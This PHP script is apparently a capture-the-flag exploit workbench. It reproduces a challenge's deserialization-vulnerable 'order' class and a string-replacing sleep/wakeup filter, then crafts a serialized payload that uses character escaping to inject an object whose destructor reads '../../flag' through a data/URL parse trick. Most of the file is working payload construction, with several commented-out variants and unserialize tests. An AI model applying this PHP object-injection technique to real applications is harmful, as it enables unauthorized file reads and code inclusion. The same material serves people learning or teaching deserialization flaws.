<?php
class UserAccount
{
    protected $username;
    protected $password;

    public function __construct($username, $password)
    {
        $this->username = $username;
        $this->password = $password;
    }
}

function object_sleep($str)
{
    $ob = str_replace(chr(0).'*'.chr(0), '@0@0@0@', $str);
    return $ob;
}

function object_weakup($ob)
{
    $r = str_replace('@0@0@0@', chr(0).'*'.chr(0), $ob);
    return $r;
}

class order
{
    public $f;
    public $hint;

    public function __construct($hint, $f)
    {
        $this->f = $f;
        $this->hint = $hint;
    }

    public function __wakeup()
    {
        //something in hint.php
    }

    public function __destruct()
    {
        echo"order destructed \n";
        if (filter_var($this->hint, FILTER_VALIDATE_URL))
        {
            $r = parse_url($this->hint);
            if (!empty($this->f)) {
                if (strpos($this->f, "try") !==  false && strpos($this->f, "pass") !== false) {
                    @include($this->f . '.php');
                } else {
                    die("try again!");
                }
                if (preg_match('/prankhub$/', $r['host'])) {
                    $out = file_get_contents($this->hint);
                    echo "<br/>".$out;
                    echo 123;
                } else {
                    die("<br/>error");
                }
            } else {
                die("try it!");
            }
        }
        else
        {
            echo "Invalid URL";
        }
    }
}

//$username = $_POST['username'];
//$password = $_POST['password'];


// $passwd = '1";s:11:"'.chr(0).'*'.chr(0).'password";O:5:"order":3:{s:1:"f";s:7:"trypass";s:4:"hint";s:41:"data://prankhub/plain;base64,aGludC5waHA=";}';
// $passwd = '1";s:11:"'.chr(0).'*'.chr(0).'password";O:5:"order":2:{s:1:"f";s:7:"trypass";s:4:"hint";s:41:"data://prankhub/plain;base64,aGludC5waHA=";}';
// $passwd = '1";s:11:"'.chr(0).'*'.chr(0).'password";O:5:"order":2:{s:1:"f";s:7:"trypass";s:4:"hint";s:20:"data://prankhub/plaie";}';
// $passwd = '1";s:11:"'.chr(0).'*'.chr(0).'password";O:5:"order":2:{s:1:"f";s:7:"trypass";s:4:"hint";s:20:"0://prankhub/hint.ph;}';
$passwd = '1";s:11:"'.chr(0).'*'.chr(0).'password";O:5:"order":2:{s:1:"f";s:7:"trypass";s:4:"hint";s:20:"0://prankhub/../../f";}';
// $passwd .=';s:11:"'.chr(0).'*'.chr(0).'username";s:1"1';
echo("\n");
echo("\n");
echo("\n");
echo substr($passwd,96);
echo("\n");
echo("\n");
echo("\n");


// $passwd = '1";s:11:"'.chr(0).'*'.chr(0).'password";O:5:"order":2:{s:1:"f";s:1:"f";s:4:"hint";s:4:"hint";}';
//输出password payload
echo "urlencode passwd:   ";
$password = urlencode($passwd);
var_dump($password);
$username = '@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@';
// $user = serialize(new UserAccount($username, $password));   


//测试
echo"\n--------TEST-----------\n";
$order = 'O:5:"order":2:{s:1:"f";s:7:"trypass";s:4:"hint";s:23:"0://prankhub/../../flag";}';
$order = urlencode($order);
echo"\nunserialize \$order   ";
var_dump(unserialize(urldecode($order)));

echo "\nserialize \$user:   ";
$user = serialize(new UserAccount($username, $password));   
var_dump(unserialize($user));


echo "\nserialize \$obj:   ";
$obj = object_weakup(object_sleep($user));
var_dump(unserialize($obj));
echo"\n------------------------\n";
// var_dump(object_weakup(object_sleep($user)));
// $obj = object_weakup(object_sleep($user));
// echo "\n unserialize \$obj";
// var_dump(unserialize($obj));

